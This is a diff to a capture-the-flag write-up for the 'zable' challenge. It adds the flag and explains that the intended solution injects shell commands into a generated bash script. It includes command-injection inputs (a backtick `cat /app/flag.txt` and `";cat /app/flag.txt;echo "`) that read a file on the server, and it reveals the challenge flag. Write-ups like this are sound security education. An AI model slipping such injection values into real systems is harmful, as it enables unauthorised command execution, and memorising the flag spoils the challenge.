@@ -1,6 +1,6 @@
 ---
 created: 2024-07-21T03:54
-updated: 2024-07-21T16:08
+updated: 2024-07-21T18:42
 solves: 18
 points: 474
 ---
@@ -39,3 +39,25 @@ $ nc zable.chal.imaginaryctf.org 1337
 Enter name: `cat /app/flag.txt`
 Hello, ictf{I_supp0se_if_a_hacker_can_run_bazel_on_your_system_things_are_already_bad}!
 ```
+
+```flag
+ictf{I_supp0se_if_a_hacker_can_run_bazel_on_your_system_things_are_already_bad}
+```
+
+---
+
+After the CTF has ended I found out that the intended solution was exploiting bash file generation.
+
+The task generates a bash script like this.
+
+```shell
+EXPORT NAME="<NAME>"
+```
+
+We can inject code to make it look like this.
+
+```shell
+EXPORT NAME="";cat /app/flag.txt;echo ""
+```
+
+The payload is hence `";cat /app/flag.txt;echo "`
